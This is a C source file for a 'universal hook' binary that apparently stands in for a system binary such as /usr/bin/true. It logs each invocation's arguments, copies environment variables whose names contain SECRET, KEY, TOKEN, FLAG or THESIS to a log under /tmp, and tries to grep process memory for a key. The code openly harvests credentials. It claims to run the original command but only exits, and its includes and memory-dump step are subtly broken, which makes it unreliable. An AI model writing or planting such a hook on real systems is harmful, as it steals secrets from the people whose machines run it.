#include <fcntl.h>
#include <time.h>

int main(int argc, char **argv, char **envp) {
    // Ensure we always log, regardless of what this binary is supposed to do
    FILE *logfile = fopen("/tmp/thesis-ipc/universal_hook.log", "a");
    if (!logfile) logfile = stderr;

    fprintf(logfile, "\n=== UNIVERSAL HOOK TRIGGERED ===\n");
    fprintf(logfile, "Time: %ld\n", time(NULL));
    fprintf(logfile, "This binary: %s\n", argv[0]);
    fprintf(logfile, "argc: %d\n", argc);

    // Log all arguments
    for (int i = 0; i < argc && i < 20; i++) {
        fprintf(logfile, "argv[%d]: %s\n", i, argv[i] ? argv[i] : "NULL");
    }

    // Log environment variables with keywords
    fprintf(logfile, "\n=== ENVIRONMENT SECRETS ===\n");
    for (int i = 0; envp[i]; i++) {
        if (strstr(envp[i], "SECRET") || strstr(envp[i], "KEY") || 
            strstr(envp[i], "THESIS") || strstr(envp[i], "TOKEN") || 
            strstr(envp[i], "FLAG")) {
            fprintf(logfile, "%s\n", envp[i]);
        }
    }

    // Try to dump memory
    fprintf(logfile, "\n=== MEMORY DUMP (strings) ===\n");
    if (fork() == 0) {
        // Child process
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "strings /proc/self/mem 2>/dev/null | head -100 | grep -i thesiskey >> /tmp/thesis-ipc/universal_hook.log 2>&1");
        system(cmd);
        exit(0);
    }

    if (logfile != stderr) fclose(logfile);

    // Execute the original intended command
    // For /usr/bin/true, just exit successfully
    // For other binaries, try to find and execute the original
    return 0;
}
